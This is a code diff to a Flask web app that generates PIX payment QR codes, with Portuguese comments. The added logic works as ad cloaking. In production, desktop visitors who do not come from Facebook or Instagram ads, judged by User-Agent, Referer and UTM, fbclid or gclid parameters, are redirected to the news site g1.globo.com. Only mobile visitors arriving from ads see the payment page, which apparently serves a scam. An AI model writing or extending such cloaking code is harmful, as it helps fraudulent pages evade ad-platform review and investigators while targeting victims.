@@ -911,7 +911,18 @@ def generate_qr_code(pix_code: str) -> str:
 @app.route('/index')
 def index():
     try:
-        # Verificar se o usuário é mobile ou veio de anúncio
+        # Detectar ambiente de produção (Heroku)
+        is_heroku = os.environ.get('DYNO') is not None
+        
+        # Log para depuração em produção
+        if is_heroku:
+            app.logger.info(f"[PROD] Verificação de acesso em ambiente Heroku")
+            app.logger.info(f"[PROD] Referer: {request.headers.get('Referer', 'Nenhum')}")
+            app.logger.info(f"[PROD] User-Agent: {request.headers.get('User-Agent', 'Nenhum')}")
+            app.logger.info(f"[PROD] Tem g.is_mobile: {hasattr(g, 'is_mobile')}")
+            app.logger.info(f"[PROD] Tem g.is_from_social_ad: {hasattr(g, 'is_from_social_ad')}")
+
+        # Verificar se o request_analyzer está ativo e se o usuário é mobile ou veio de anúncio
         # Esta é uma verificação adicional além do middleware
         if hasattr(g, 'is_mobile') and hasattr(g, 'is_from_social_ad'):
             is_mobile = g.is_mobile
@@ -919,6 +930,9 @@ def index():
             
             # Verificar se estamos em produção (não desenvolvimento)
             developing = os.environ.get('DEVELOPING', 'false').lower() == 'true'
+            
+            # Log sobre o estado de detecção
+            app.logger.info(f"[PROD] Detecção: mobile={is_mobile}, ad={is_from_social_ad}, dev={developing}")
             
             # Se não for mobile e não vier de anúncio social, e estivermos em produção,
             # redirecionar para g1.globo.com
@@ -936,6 +950,28 @@ def index():
                     return redirect('https://g1.globo.com')
                 else:
                     app.logger.debug(f"[DEV] Requisição do Replit detectada, ignorando redirecionamento")
+        else:
+            # Se g.is_mobile e g.is_from_social_ad não estiverem definidos, o middleware pode não estar ativo
+            app.logger.warning(f"[PROD] O middleware request_analyzer parece não estar ativo!")
+            
+            # Verificação de fallback para garantir redirecionamento em produção quando o middleware falha
+            if is_heroku:
+                # Verificar se é mobile pelo User-Agent
+                user_agent = request.headers.get('User-Agent', '').lower()
+                is_mobile_manual = any(device in user_agent for device in ['android', 'iphone', 'ipad', 'mobile', 'tablet'])
+                
+                # Verificar se é de anúncio pelo Referer ou parâmetros UTM
+                referer = request.headers.get('Referer', '').lower()
+                has_social_params = any(param in request.args for param in ['utm_source', 'fbclid', 'igshid', 'gclid'])
+                from_social_referer = any(domain in referer for domain in ['facebook', 'instagram', 'fb.com'])
+                
+                # Log para depuração
+                app.logger.info(f"[PROD] Verificação manual: mobile={is_mobile_manual}, social={has_social_params or from_social_referer}")
+                
+                # Se não for mobile e não for de anúncio, redirecionar
+                if not is_mobile_manual and not (has_social_params or from_social_referer):
+                    app.logger.info(f"[PROD] Redirecionando desktop não-anúncio para g1 (fallback)")
+                    return redirect('https://g1.globo.com')
         
         # Get data from query parameters for backward compatibility
         customer_data = {
